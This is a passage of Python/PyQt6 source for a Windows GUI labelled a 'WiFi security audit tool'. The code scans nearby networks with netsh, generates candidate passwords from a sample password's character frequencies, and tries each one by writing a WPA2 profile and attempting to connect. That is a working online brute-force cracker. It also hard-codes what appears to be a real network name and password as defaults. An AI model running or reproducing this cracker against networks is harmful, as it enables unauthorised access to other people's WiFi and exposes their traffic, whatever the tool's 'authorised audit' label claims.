# -*- coding: utf-8 -*-
import sys
import os
import subprocess
import time
import threading
import winsound
from collections import Counter
from itertools import product

from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer, QRectF
from PyQt6.QtGui import (QFont, QCursor, QIcon, QPixmap, QPainter,
                          QColor, QBrush, QPen, QRadialGradient)
from PyQt6.QtWidgets import (
    QApplication, QWidget, QLabel, QLineEdit, QPushButton,
    QVBoxLayout, QHBoxLayout, QCheckBox, QTextEdit, QMessageBox,
    QFrame, QProgressBar, QSplitter, QSizePolicy, QGroupBox,
    QComboBox
)

# ─────────────────────────────────────────────────────────────────────────────
# 关键修复：隐藏所有子进程控制台窗口
# ─────────────────────────────────────────────────────────────────────────────
_HIDE_CONSOLE = subprocess.STARTUPINFO()
_HIDE_CONSOLE.dwFlags    |= subprocess.STARTF_USESHOWWINDOW
_HIDE_CONSOLE.wShowWindow = subprocess.SW_HIDE

_SUBPROCESS_KW = dict(
    startupinfo   = _HIDE_CONSOLE,
    creationflags = subprocess.CREATE_NO_WINDOW,   # 双重保险
    capture_output = True,
    encoding       = "gbk",
    errors         = "ignore",
)


def _run(args: list, timeout: int = 20) -> str:
    """统一执行子进程，完全无控制台窗口"""
    try:
        return subprocess.run(args, timeout=timeout, **_SUBPROCESS_KW).stdout
    except Exception:
        return ""


# ─────────────────────────────────────────────────────────────────────────────
# 常量定义
# ─────────────────────────────────────────────────────────────────────────────
DEFAULT_SSID     = "ChinaNet-JwWi"
DEFAULT_PASSWORD = "1003888732"

SIMILAR_CHARS   = set("1lIi|oO0")
AMBIGUOUS_CHARS = set(r"""()[]{}|;:'",.<>/?`~\\""")

_TIP_UPPER   = "包含字符：\nA B C D E F G H I J K L M\nN O P Q R S T U V W X Y Z"
_TIP_LOWER   = "包含字符：\na b c d e f g h i j k l m\nn o p q r s t u v w x y z"
_TIP_DIGIT   = "包含字符：\n0 1 2 3 4 5 6 7 8 9"
_TIP_SPECIAL = (
    "包含以下特殊符号（共 33 个）：\n"
    "!  @  #  %  ^  &  *  _  -  +  =\n"
    ":  \"  '  ;  ,  .  ?  /  \\  $  ~\n"
    "(  )  [  ]  {  }  <  >  |  `"
)
_TIP_SIM = (
    "将排除以下视觉相似字符：\n"
    "  1  （数字一）\n"
    "  l  （小写字母 L）\n"
    "  I  （大写字母 i）\n"
    "  i  （小写字母 i）\n"
    "  |  （竖线）\n"
    "  o  （小写字母 o）\n"
    "  O  （大写字母 O）\n"
    "  0  （数字零）"
)
_TIP_AMB = (
    "将排除以下歧义标点符号：\n"
    "  (  )  [  ]  {  }\n"
    "  |  ;  :  \"  '\n"
    "  ,  .  <  >  /  ?\n"
    "  `  ~  \\"
)


# ─────────────────────────────────────────────────────────────────────────────
# 生成程序图标（运行时绘制，无需外部文件）
# ─────────────────────────────────────────────────────────────────────────────
def _generate_app_icon() -> QIcon:
    sizes = [16, 32, 48, 64, 128, 256]
    icon  = QIcon()
    for s in sizes:
        pix = QPixmap(s, s)
        pix.fill(QColor(0, 0, 0, 0))
        p = QPainter(pix)
        p.setRenderHint(QPainter.RenderHint.Antialiasing, True)
        cx, cy = s / 2, s / 2
        r = s / 2 - 1
        grad = QRadialGradient(cx, cy * 0.6, r * 1.4)
        grad.setColorAt(0.0, QColor(60, 120, 255))
        grad.setColorAt(1.0, QColor(20, 50, 160))
        p.setBrush(QBrush(grad))
        p.setPen(Qt.PenStyle.NoPen)
        p.drawEllipse(1, 1, s - 2, s - 2)
        pen_w = max(1.5, s / 18)
        wifi_cx, wifi_cy = cx, cy * 0.55
        for i, ratio in enumerate([0.55, 0.38, 0.22]):
            arc_r = r * ratio
            alpha = 230 - i * 40
            p.setPen(QPen(QColor(255, 255, 255, alpha), pen_w,
                          Qt.PenStyle.SolidLine, Qt.PenCapStyle.RoundCap))
            p.drawArc(QRectF(wifi_cx - arc_r, wifi_cy - arc_r,
                             arc_r * 2, arc_r * 2), 45 * 16, 90 * 16)
        dot_r = max(1.5, s / 14)
        p.setPen(Qt.PenStyle.NoPen)
        p.setBrush(QBrush(QColor(255, 255, 255, 240)))
        p.drawEllipse(QRectF(wifi_cx - dot_r, wifi_cy - dot_r,
                             dot_r * 2, dot_r * 2))
        lock_w = s * 0.28
        lock_h = s * 0.20
        lock_x = cx - lock_w / 2
        lock_y = cy + r * 0.25
        p.setBrush(QBrush(QColor(255, 210, 60, 220)))
        lock_rr = max(1.0, s / 30)
        p.drawRoundedRect(QRectF(lock_x, lock_y, lock_w, lock_h), lock_rr, lock_rr)
        ring_pen = max(1.2, s / 22)
        p.setPen(QPen(QColor(255, 210, 60, 220), ring_pen,
                      Qt.PenStyle.SolidLine, Qt.PenCapStyle.RoundCap))
        p.setBrush(Qt.BrushStyle.NoBrush)
        ring_w = lock_w * 0.55
        ring_h = lock_h * 0.7
        p.drawArc(QRectF(cx - ring_w / 2, lock_y - ring_h,
                         ring_w, ring_h * 2), 0 * 16, 180 * 16)
        p.end()
        icon.addPixmap(pix)
    return icon


# ─────────────────────────────────────────────────────────────────────────────
# WiFi 扫描线程
# ─────────────────────────────────────────────────────────────────────────────
class WifiScanThread(QThread):
    scan_finished = pyqtSignal(list)

    def run(self):
        results = []
        try:
            out = _run(["netsh", "wlan", "show", "networks", "mode=bssid"],
                       timeout=15)
            current_ssid   = None
            current_signal = 0
            for line in out.splitlines():
                line = line.strip()
                if line.startswith("SSID") and "BSSID" not in line:
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        ssid = parts[1].strip()
                        if ssid:
                            current_ssid   = ssid
                            current_signal = 0
                elif ("信号" in line or "Signal" in line) and current_ssid:
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        try:
                            current_signal = int(
                                parts[1].strip().replace("%", "")
                            )
                        except ValueError:
                            current_signal = 0
                    results.append((current_ssid, current_signal))
                    current_ssid = None
            best = {}
            for ssid, sig in results:
                if ssid not in best or sig > best[ssid]:
                    best[ssid] = sig
            results = sorted(best.items(), key=lambda x: x[1], reverse=True)
        except Exception:
            pass
        self.scan_finished.emit(results)


# ─────────────────────────────────────────────────────────────────────────────
# 成功音效
# ─────────────────────────────────────────────────────────────────────────────
def play_success_sound():
    def _play():
        phrase1 = [(523,150),(659,150),(784,150),(1047,450),
                   (880,120),(988,120),(1047,600)]
        phrase2 = [(784,100),(880,100),(988,100),
                   (1047,100),(1175,100),(1319,800)]
        phrase3 = [(1047,120),(1175,120),(1319,120),(1047,900)]
        try:
            for seg in (phrase1, phrase2, phrase3):
                for freq, dur in seg:
                    winsound.Beep(freq, dur)
                    time.sleep(0.025)
                time.sleep(0.12)
        except Exception:
            try:
                winsound.MessageBeep(winsound.MB_ICONEXCLAMATION)
            except Exception:
                pass
    threading.Thread(target=_play, daemon=True).start()


# ─────────────────────────────────────────────────────────────────────────────
# 样式常量
# ─────────────────────────────────────────────────────────────────────────────
_CB_STYLE = """
    QCheckBox {{
        color: {color}; font-size: 13px; spacing: 6px;
    }}
    QCheckBox::indicator {{
        width: 17px; height: 17px; border-radius: 4px;
        border: 1.5px solid {border};
        background: rgba(255,255,255,0.07);
    }}
    QCheckBox::indicator:checked {{
        background: {checked_bg}; border-color: {checked_border};
    }}
    QCheckBox::indicator:hover {{ border-color: {hover_border}; }}
    QCheckBox:checked {{ color: #e8f4ff; }}
"""
_TOOLTIP_STYLE = """
    QToolTip {
        background-color: #111d36; color: #cce0ff;
        border: 1px solid #2a4a8f; border-radius: 7px;
        padding: 8px 14px; font-size: 12px;
        font-family: "Microsoft YaHei UI", "Consolas", monospace;
    }
"""


def _make_cb(text, checked=True, tooltip="",
             color="#c0d4ff", border="#5577cc",
             checked_bg="#3a6adf", checked_border="#4a8aff",
             hover_border="#7799ee") -> QCheckBox:
    cb = QCheckBox(text)
    cb.setChecked(checked)
    cb.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
    if tooltip:
        cb.setToolTip(tooltip)
    cb.setStyleSheet(
        _CB_STYLE.format(color=color, border=border,
                         checked_bg=checked_bg,
                         checked_border=checked_border,
                         hover_border=hover_border) + _TOOLTIP_STYLE
    )
    return cb


# ─────────────────────────────────────────────────────────────────────────────
# 多选长度控件
# ─────────────────────────────────────────────────────────────────────────────
class MultiSelectComboLike(QWidget):
    def __init__(self, title="密码长度（位数）", values=None):
        super().__init__()
        self.values = values or []
        lay = QVBoxLayout(self)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(5)
        lbl = QLabel(title)
        lbl.setStyleSheet("color:#ddeaff; font-size:13px; font-weight:600;")
        lay.addWidget(lbl)
        row = QHBoxLayout()
        row.setSpacing(10)
        self.checkboxes: list[tuple[int, QCheckBox]] = []
        for v in self.values:
            cb = _make_cb(f"{v} 位", checked=(v == 8),
                          color="#ccd8ff", border="#7a9fff",
                          checked_bg="#4a90ff", checked_border="#4a90ff",
                          hover_border="#aac4ff")
            row.addWidget(cb)
            self.checkboxes.append((v, cb))
        row.addStretch()
        lay.addLayout(row)

    def selected_values(self) -> list[int]:
        return sorted(v for v, cb in self.checkboxes if cb.isChecked())


# ─────────────────────────────────────────────────────────────────────────────
# 闪烁指示标签
# ─────────────────────────────────────────────────────────────────────────────
class FlashLabel(QLabel):
    def __init__(self, parent=None):
        super().__init__(parent)
        self._timer        = QTimer(self)
        self._timer.timeout.connect(self._on_tick)
        self._blink_count  = 0
        self._blink_target = 0
        self._blink_color  = "#ff4444"
        self._base_text    = ""
        self.setMinimumWidth(200)
        self.setStyleSheet("color:#7a9dff; font-size:13px; font-family:Consolas;")
        self.setText("")

    def show_trying(self, pwd: str):
        self._stop_blink()
        self._base_text = pwd
        self.setText(f"⟳  {pwd}")
        self.setStyleSheet(
            "color:#aac4ff; font-size:13px; font-weight:600;"
            "font-family:Consolas; background:transparent;"
        )

    def show_fail(self, pwd: str):
        self._stop_blink()
        self._base_text    = pwd
        self._blink_color  = "#ff4040"
        self._blink_count  = 0
        self._blink_target = 5
        self.setText(f"✕  {pwd}")
        self.setStyleSheet(
            f"color:{self._blink_color}; font-size:13px; font-weight:700;"
            "font-family:Consolas; background:transparent;"
        )
        self._timer.start(120)

    def show_success(self, pwd: str):
        self._stop_blink()
        self.setText(f"✔  {pwd}")
        self.setStyleSheet(
            "color:#3dd68c; font-size:14px; font-weight:700;"
            "font-family:Consolas; background:transparent;"
        )

    def clear_display(self):
        self._stop_blink()
        self.setText("")
        self.setStyleSheet(
            "color:#7a9dff; font-size:13px; font-family:Consolas;"
        )

    def _stop_blink(self):
        self._timer.stop()
        self._blink_count = 0

    def _on_tick(self):
        self._blink_count += 1
        if self._blink_count % 2 == 1:
            self.setStyleSheet(
                f"color:{self._blink_color}; font-size:13px; font-weight:700;"
                "font-family:Consolas; background:transparent;"
            )
            self.setText(f"✕  {self._base_text}")
        else:
            self.setStyleSheet(
                "color:transparent; font-size:13px;"
                "font-family:Consolas; background:transparent;"
            )
        if self._blink_count >= self._blink_target * 2:
            self._stop_blink()
            self.setStyleSheet(
                "color:#cc3333; font-size:13px; font-weight:600;"
                "font-family:Consolas; background:transparent;"
            )
            self.setText(f"✕  {self._base_text}")


# ─────────────────────────────────────────────────────────────────────────────
# WiFi 连接核心（使用统一 _run，无控制台窗口）
# ─────────────────────────────────────────────────────────────────────────────
class WifiCore:
    @staticmethod
    def try_connect(ssid: str, password: str,
                    stop_flag_ref: list) -> tuple[str, str]:
        xml = (
            '<?xml version="1.0"?>\n'
            '<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">\n'
            f'  <name>{ssid}</name>\n'
            '  <SSIDConfig><SSID>'
            f'<name>{ssid}</name>'
            '</SSID></SSIDConfig>\n'
            '  <connectionType>ESS</connectionType>\n'
            '  <connectionMode>auto</connectionMode>\n'
            '  <MSM><security>\n'
            '    <authEncryption>\n'
            '      <authentication>WPA2PSK</authentication>\n'
            '      <encryption>AES</encryption>\n'
            '      <useOneX>false</useOneX>\n'
            '    </authEncryption>\n'
            '    <sharedKey>\n'
            '      <keyType>passPhrase</keyType>\n'
            '      <protected>false</protected>\n'
            f'      <keyMaterial>{password}</keyMaterial>\n'
            '    </sharedKey>\n'
            '  </security></MSM>\n'
            '</WLANProfile>'
        )
        temp = f"_waudit_{os.getpid()}.xml"
        try:
            _run(["netsh", "wlan", "delete", "profile", f"name={ssid}"])
            with open(temp, "w", encoding="utf-8") as f:
                f.write(xml)
            _run(["netsh", "wlan", "add", "profile",
                  f"filename={temp}", "user=all"])
            _run(["netsh", "wlan", "connect", f"name={ssid}"])

            time.sleep(0.8)
            for _ in range(16):
                if stop_flag_ref[0]:
                    return f"⏸  已停止（密码：{password}）", "warn"
                out = _run(["netsh", "wlan", "show", "interfaces"])
                if ssid in out and "已连接" in out:
                    return f"✅ 连接成功！密码：{password}", "success"
                time.sleep(0.5)
            return f"❌ '{password}' — 超时未连接", "info"
        except Exception as exc:
            return f"⚠️  '{password}' — 异常：{exc}", "error"
        finally:
            try:
                if os.path.exists(temp):
                    os.remove(temp)
            except OSError:
                pass


# ─────────────────────────────────────────────────────────────────────────────
# 批量尝试线程
# ─────────────────────────────────────────────────────────────────────────────
class WifiConnectThread(QThread):
    status_signal   = pyqtSignal(str, str)
    progress_signal = pyqtSignal(int, int, float)
    phase_signal    = pyqtSignal(str)
    success_signal  = pyqtSignal(str)
    trying_signal   = pyqtSignal(str)
    result_signal   = pyqtSignal(str, bool)

    def __init__(self, ssid, high, low):
        super().__init__()
        self.ssid  = ssid
        self.high  = high
        self.low   = low
        self._stop = [False]

    def stop(self):
        self._stop[0] = True

    def _attempt(self, pwd, cur, total, t0):
        self.trying_signal.emit(pwd)
        msg, lvl = WifiCore.try_connect(self.ssid, pwd, self._stop)
        self.result_signal.emit(pwd, lvl == "success")
        self.status_signal.emit(msg, lvl)
        self.progress_signal.emit(cur, total, time.time() - t0)
        return lvl

    def run(self):
        total = len(self.high) + len(self.low)
        t0    = time.time()

        self.phase_signal.emit("🔥 阶段一：正在尝试高频字符组合候选密码...")
        for i, pwd in enumerate(self.high):
            if self._stop[0]:
                self.status_signal.emit("❌ 用户中止尝试", "error")
                return
            if self._attempt(pwd, i + 1, total, t0) == "success":
                self.success_signal.emit(pwd)
                return

        self.status_signal.emit("─" * 56, "info")
        self.status_signal.emit("⚠️  高频候选密码已全部尝试，未找到匹配密码。", "warn")
        self.status_signal.emit("⏩  进入阶段二：尝试低频 / 扩展字符候选密码...", "warn")
        self.status_signal.emit("─" * 56, "info")

        offset = len(self.high)
        self.phase_signal.emit("🧊 阶段二：正在尝试低频 / 扩展字符组合候选密码...")
        for i, pwd in enumerate(self.low):
            if self._stop[0]:
                self.status_signal.emit("❌ 用户中止尝试", "error")
                return
            if self._attempt(pwd, offset + i + 1, total, t0) == "success":
                self.success_signal.emit(pwd)
                return

        self.status_signal.emit("─" * 56, "info")
        self.status_signal.emit("🔚 所有候选密码已尝试完毕，未找到匹配密码。", "warn")


# ─────────────────────────────────────────────────────────────────────────────
# 直接连接线程
# ─────────────────────────────────────────────────────────────────────────────
class DirectConnectThread(QThread):
    status_signal  = pyqtSignal(str, str)
    success_signal = pyqtSignal(str)

    def __init__(self, ssid, password):
        super().__init__()
        self.ssid     = ssid
        self.password = password
        self._stop    = [False]
        self._ok      = False

    def run(self):
        self.status_signal.emit(
            f"⏳ 正在直接连接 '{self.ssid}'，密码：'{self.password}'...", "info"
        )
        msg, lvl = WifiCore.try_connect(self.ssid, self.password, self._stop)
        self.status_signal.emit(msg, lvl)
        if lvl == "success":
            self._ok = True
            self.success_signal.emit(self.password)


# ─────────────────────────────────────────────────────────────────────────────
# 密码候选生成器
# ─────────────────────────────────────────────────────────────────────────────
class PasswordCandidateGenerator:
    def __init__(self, charset, lengths, sample, use_digits, use_letters):
        self.lengths     = lengths
        self.use_digits  = use_digits
        self.use_letters = use_letters
        freq             = Counter(sample)
        self.high_chars  = [c for c, _ in freq.most_common() if c in charset]
        high_set         = set(self.high_chars)
        self.low_chars   = [c for c in charset if c not in high_set]

    @staticmethod
    def _gen(chars, lengths, limit):
        out = []
        for n in lengths:
            if len(out) >= limit:
                break
            for combo in product(chars, repeat=n):
                out.append("".join(combo))
                if len(out) >= limit:
                    break
        return out

    def _subsets(self, chars):
        digits  = [c for c in chars if c.isdigit()]
        letters = [c for c in chars if c.isalpha()]
        subsets = []
        if self.use_digits  and digits:                 subsets.append(digits)
        if self.use_letters and letters:                subsets.append(letters)
        if self.use_digits and self.use_letters \
                and digits and letters:                 subsets.append(chars)
        if not subsets:                                 subsets.append(chars)
        return subsets

    def generate(self, max_high=300, max_low=300):
        def _build(chars, limit):
            subs = self._subsets(chars)
            per  = max(1, limit // len(subs))
            buf  = []
            for s in subs:
                buf += self._gen(s, self.lengths, per)
            return list(dict.fromkeys(buf))[:limit]
        high = _build(self.high_chars, max_high)
        low  = _build(self.low_chars,  max_low) if self.low_chars else []
        return high, low


# ─────────────────────────────────────────────────────────────────────────────
# 主窗口
# ─────────────────────────────────────────────────────────────────────────────
class WifiToolWindow(QWidget):

    _QSS = """
        QWidget {
            background: #0d1525;
            font-family: "Microsoft YaHei UI", "Segoe UI", sans-serif;
        }
        QLabel { color: #b8ccee; }
        QGroupBox {
            color: #7a9dff; font-size: 13px; font-weight: 600;
            border: 1px solid rgba(90,130,255,0.20);
            border-radius: 10px; margin-top: 14px;
            padding: 14px 16px 12px 16px;
            background: rgba(255,255,255,0.022);
        }
        QGroupBox::title {
            subcontrol-origin: margin; subcontrol-position: top left;
            left: 16px; padding: 0 6px; color: #6a8dff;
        }
        QLineEdit {
            background: rgba(255,255,255,0.05);
            border: 1.5px solid rgba(90,140,255,0.26);
            border-radius: 7px; padding: 7px 11px;
            font-size: 14px; color: #e4eeff;
            selection-background-color: #3060cf;
        }
        QLineEdit:focus {
            border-color: #4a85ff; background: rgba(255,255,255,0.08);
        }
        QLineEdit:disabled {
            color: rgba(160,180,220,0.35);
            border-color: rgba(90,140,255,0.12);
        }
        QComboBox {
            background: rgba(255,255,255,0.05);
            border: 1.5px solid rgba(90,140,255,0.26);
            border-radius: 7px; padding: 7px 11px;
            font-size: 14px; color: #e4eeff; min-height: 20px;
        }
        QComboBox:focus, QComboBox:on {
            border-color: #4a85ff; background: rgba(255,255,255,0.08);
        }
        QComboBox:disabled {
            color: rgba(160,180,220,0.35);
            border-color: rgba(90,140,255,0.12);
        }
        QComboBox::drop-down { width: 28px; border: none; }
        QComboBox::down-arrow {
            border-left: 5px solid transparent;
            border-right: 5px solid transparent;
            border-top: 6px solid #7a9dff; margin-right: 8px;
        }
        QComboBox QAbstractItemView {
            background: #111d36;
            border: 1px solid rgba(90,140,255,0.35);
            border-radius: 6px; color: #d0e0ff;
            selection-background-color: #2a4a8f;
            selection-color: #ffffff;
            padding: 4px; font-size: 13px; outline: none;
        }
        QComboBox QAbstractItemView::item {
            padding: 6px 10px; min-height: 26px;
        }
        QComboBox QAbstractItemView::item:hover {
            background: rgba(60,110,220,0.3);
        }
        QPushButton {
            background: qlineargradient(x1:0,y1:0,x2:0,y2:1,
                stop:0 #3565de, stop:1 #2450b0);
            color: #fff; font-size: 14px; font-weight: 600;
            border: none; border-radius: 8px; padding: 9px 24px;
        }
        QPushButton:hover {
            background: qlineargradient(x1:0,y1:0,x2:0,y2:1,
                stop:0 #4575ee, stop:1 #3460c0);
        }
        QPushButton:pressed {
            background: qlineargradient(x1:0,y1:0,x2:0,y2:1,
                stop:0 #2555ce, stop:1 #1a40a0);
        }
        QPushButton:disabled {
            background: rgba(80,85,115,0.32);
            color: rgba(170,180,205,0.32);
        }
        QPushButton#btn_direct {
            background: qlineargradient(x1:0,y1:0,x2:0,y2:1,
                stop:0 #25a85a, stop:1 #1b7f43);
        }
        QPushButton#btn_direct:hover {
            background: qlineargradient(x1:0,y1:0,x2:0,y2:1,
                stop:0 #2dc96c, stop:1 #25a85a);
        }
        QPushButton#btn_direct:disabled {
            background: rgba(80,85,115,0.32);
            color: rgba(170,180,205,0.32);
        }
        QPushButton#btn_stop {
            background: qlineargradient(x1:0,y1:0,x2:0,y2:1,
                stop:0 #be3628, stop:1 #952b1f);
        }
        QPushButton#btn_stop:hover {
            background: qlineargradient(x1:0,y1:0,x2:0,y2:1,
                stop:0 #e04535, stop:1 #be3628);
        }
        QPushButton#btn_stop:disabled {
            background: rgba(80,85,115,0.32);
            color: rgba(170,180,205,0.32);
        }
        QPushButton#btn_clear {
            background: rgba(255,255,255,0.055);
            color: #7a9dff;
            border: 1px solid rgba(90,140,255,0.25);
        }
        QPushButton#btn_clear:hover  { background: rgba(255,255,255,0.10); }
        QPushButton#btn_clear:pressed { background: rgba(255,255,255,0.03); }
        QPushButton#btn_scan {
            background: qlineargradient(x1:0,y1:0,x2:0,y2:1,
                stop:0 #6a5acd, stop:1 #553ab5);
            padding: 9px 16px;
        }
        QPushButton#btn_scan:hover {
            background: qlineargradient(x1:0,y1:0,x2:0,y2:1,
                stop:0 #7b6be0, stop:1 #6a5acd);
        }
        QPushButton#btn_scan:disabled {
            background: rgba(80,85,115,0.32);
            color: rgba(170,180,205,0.32);
        }
        QTextEdit {
            background: #060c1a;
            border: 1px solid rgba(60,100,200,0.20);
            border-radius: 10px; color: #a8c2ee; font-size: 13px;
            padding: 10px 13px;
            font-family: "Consolas","Cascadia Code","Courier New",monospace;
        }
        QProgressBar {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(90,140,255,0.16);
            border-radius: 6px; text-align: center;
            color: #7a9dff; font-size: 12px; font-weight: 600;
        }
        QProgressBar::chunk {
            background: qlineargradient(x1:0,y1:0,x2:1,y2:0,
                stop:0 #3565de, stop:1 #25a85a);
            border-radius: 5px;
        }
        QSplitter::handle {
            background: rgba(70,120,210,0.16); border-radius: 3px;
        }
        QSplitter::handle:hover { background: rgba(70,120,210,0.38); }
        QSplitter::handle:vertical { height: 7px; }
        QToolTip {
            background-color: #111d36; color: #cce0ff;
            border: 1px solid #2a4a8f; border-radius: 7px;
            padding: 8px 14px; font-size: 12px;
            font-family: "Microsoft YaHei UI","Consolas",monospace;
        }
    """

    def __init__(self):
        super().__init__()
        self.setWindowTitle("WiFi 安全审计工具")
        self.connect_thread: WifiConnectThread | None = None
        self.direct_thread:  DirectConnectThread | None = None
        self.scan_thread:    WifiScanThread | None = None

        self._attempt_start : float = 0.0
        self._attempt_done  : int   = 0
        self._attempt_total : int   = 0
        self._elapsed_timer = QTimer(self)
        self._elapsed_timer.timeout.connect(self._update_eta_display)

        self._app_icon = _generate_app_icon()
        self.setWindowIcon(self._app_icon)
        self._build_ui()
        self._start_wifi_scan()

    # ── UI 构建 ───────────────────────────────────────────────────────────────
    def _build_ui(self):
        self.setStyleSheet(self._QSS)
        root = QVBoxLayout(self)
        root.setContentsMargins(22, 16, 22, 16)
        root.setSpacing(12)

        # 标题行
        hdr = QHBoxLayout()
        ico = QLabel("🔐"); ico.setStyleSheet("font-size:23px;")
        ttl = QLabel("WiFi 安全审计工具")
        ttl.setStyleSheet(
            "color:#ddeaff; font-size:20px; font-weight:700; letter-spacing:1px;"
        )
        sub = QLabel("  仅供授权安全审计与教学演示使用")
        sub.setStyleSheet("color:#3d5578; font-size:12px;")
        hdr.addWidget(ico); hdr.addWidget(ttl)
        hdr.addWidget(sub); hdr.addStretch()
        root.addLayout(hdr)
        root.addWidget(self._divider())

        sp = QSplitter(Qt.Orientation.Vertical)
        sp.setChildrenCollapsible(False)
        sp.setHandleWidth(8)

        # ══ 配置区 ════════════════════════════════════════════════════════════
        cfg_w = QWidget(); cfg_w.setStyleSheet("background:transparent;")
        cfg_l = QVBoxLayout(cfg_w)
        cfg_l.setContentsMargins(0, 0, 0, 0); cfg_l.setSpacing(10)

        # Group 1 ── 连接目标
        g1 = QGroupBox("  🎯  连接目标")
        g1_l = QVBoxLayout(g1); g1_l.setSpacing(10)

        ssid_row = QHBoxLayout(); ssid_row.setSpacing(10)
        lb_ssid = QLabel("WiFi 名称"); lb_ssid.setFixedWidth(68)
        self.ssid_combo = QComboBox()
        self.ssid_combo.setEditable(True)
        self.ssid_combo.setInsertPolicy(QComboBox.InsertPolicy.NoInsert)
        self.ssid_combo.lineEdit().setPlaceholderText(
            "选择或输入 WiFi 名称（SSID）"
        )
        self.ssid_combo.setCurrentText(DEFAULT_SSID)
        self.ssid_combo.setSizePolicy(
            QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Fixed
        )
        self.ssid_combo.setMinimumHeight(36)
        self.btn_scan = self._btn("🔄  扫描WiFi", "btn_scan")
        self.btn_scan.setFixedWidth(120)
        self.btn_scan.clicked.connect(self._start_wifi_scan)
        self.scan_status_lbl = QLabel("")
        self.scan_status_lbl.setStyleSheet(
            "color:#7a9dff; font-size:11px; font-style:italic;"
        )
        ssid_row.addWidget(lb_ssid)
        ssid_row.addWidget(self.ssid_combo, 1)
        ssid_row.addWidget(self.btn_scan)
        ssid_row.addWidget(self.scan_status_lbl)
        g1_l.addLayout(ssid_row)

        pwd_row = QHBoxLayout(); pwd_row.setSpacing(10)
        lb_pwd = QLabel("样本密码"); lb_pwd.setFixedWidth(68)
        self.pwd_edit = QLineEdit(DEFAULT_PASSWORD)
        self.pwd_edit.setPlaceholderText("输入样本密码（用于字符频率分析）")
        self.flash_lbl = FlashLabel()
        self.flash_lbl.setFixedWidth(260)
        pwd_row.addWidget(lb_pwd)
        pwd_row.addWidget(self.pwd_edit, 1)
        pwd_row.addWidget(self.flash_lbl)
        g1_l.addLayout(pwd_row)
        cfg_l.addWidget(g1)

        # Group 2 ── 密码生成参数
        g2 = QGroupBox("  ⚙️  密码生成参数")
        r2 = QVBoxLayout(g2); r2.setSpacing(10)
        self.len_sel = MultiSelectComboLike("密码长度（位数）", list(range(8, 13)))
        r2.addWidget(self.len_sel)

        cs_row = QHBoxLayout(); cs_row.setSpacing(16)
        lb_cs = QLabel("字符集："); lb_cs.setFixedWidth(58)
        self.cb_upper   = _make_cb("✓ 大写字母  A-Z", tooltip=_TIP_UPPER)
        self.cb_lower   = _make_cb("✓ 小写字母  a-z", tooltip=_TIP_LOWER)
        self.cb_digit   = _make_cb("✓ 数字  0-9",     tooltip=_TIP_DIGIT)
        self.cb_special = _make_cb("✓ 特殊符号",       tooltip=_TIP_SPECIAL)
        cs_row.addWidget(lb_cs)
        for cb in (self.cb_upper, self.cb_lower, self.cb_digit, self.cb_special):
            cs_row.addWidget(cb)
        cs_row.addStretch()
        r2.addLayout(cs_row)

        ex_row = QHBoxLayout(); ex_row.setSpacing(16)
        lb_ex = QLabel("排除项："); lb_ex.setFixedWidth(58)
        self.cb_excl_sim = _make_cb(
            "✓ 排除相似字符", checked=False, tooltip=_TIP_SIM
        )
        self.cb_excl_amb = _make_cb(
            "✓ 排除歧义符号", checked=False, tooltip=_TIP_AMB
        )
        ex_row.addWidget(lb_ex)
        ex_row.addWidget(self.cb_excl_sim)
        ex_row.addWidget(self.cb_excl_amb)
        ex_row.addStretch()
        r2.addLayout(ex_row)
        cfg_l.addWidget(g2)

        # 按钮行
        btn_row = QHBoxLayout(); btn_row.setSpacing(10)
        self.btn_start  = self._btn("▶  开始尝试", "btn_start")
        self.btn_stop   = self._btn("⏹  停止尝试", "btn_stop")
        self.btn_direct = self._btn("⚡  直接连接", "btn_direct")
        self.btn_clear  = self._btn("🗑  清空日志", "btn_clear")
        self.btn_start.clicked.connect(self.start_attempt)
        self.btn_stop.clicked.connect(self.stop_attempt)
        self.btn_direct.clicked.connect(self.direct_connect)
        self.btn_clear.clicked.connect(self.clear_output)
        self.btn_stop.setEnabled(False)
        btn_row.addWidget(self.btn_start)
        btn_row.addWidget(self.btn_stop)
        btn_row.addWidget(self.btn_direct)
        btn_row.addStretch()
        btn_row.addWidget(self.btn_clear)
        cfg_l.addLayout(btn_row)

        # 进度条
        self.progress = QProgressBar()
        self.progress.setVisible(False)
        self.progress.setFixedHeight(20)
        self.progress.setFormat("%p%  （%v / %m）")
        cfg_l.addWidget(self.progress)

        # 计时行
        time_row = QHBoxLayout(); time_row.setSpacing(0)
        self.elapsed_lbl = QLabel("")
        self.elapsed_lbl.setStyleSheet(
            "color:#7a9dff; font-size:12px; font-weight:600;"
        )
        self.eta_lbl = QLabel("")
        self.eta_lbl.setStyleSheet(
            "color:#ffcc44; font-size:12px; font-weight:600;"
        )
        self.eta_lbl.setAlignment(Qt.AlignmentFlag.AlignRight)
        time_row.addWidget(self.elapsed_lbl)
        time_row.addStretch()
        time_row.addWidget(self.eta_lbl)
        cfg_l.addLayout(time_row)

        # 状态行
        st = QHBoxLayout()
        self.phase_lbl = QLabel("")
        self.phase_lbl.setStyleSheet(
            "color:#ffcc44; font-size:12px; font-weight:600;"
        )
        self.status_lbl = QLabel("就绪")
        self.status_lbl.setStyleSheet(
            "color:#3dd68c; font-weight:600; font-size:12px;"
        )
        st.addWidget(self.phase_lbl); st.addStretch()
        st.addWidget(self.status_lbl)
        cfg_l.addLayout(st)
        sp.addWidget(cfg_w)

        # ══ 日志区 ════════════════════════════════════════════════════════════
        log_w = QWidget(); log_w.setStyleSheet("background:transparent;")
        log_l = QVBoxLayout(log_w)
        log_l.setContentsMargins(0, 4, 0, 0); log_l.setSpacing(4)
        log_hdr = QLabel("📋  运行日志")
        log_hdr.setStyleSheet(
            "color:#6a8dff; font-size:13px; font-weight:600;"
        )
        log_l.addWidget(log_hdr)
        self.output = QTextEdit()
        self.output.setReadOnly(True)
        self.output.setSizePolicy(
            QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Expanding
        )
        log_l.addWidget(self.output, 1)
        sp.addWidget(log_w)

        sp.setStretchFactor(0, 0); sp.setStretchFactor(1, 1)
        sp.setSizes([490, 9999])
        root.addWidget(sp, 1)

        for t in [
            "═" * 66,
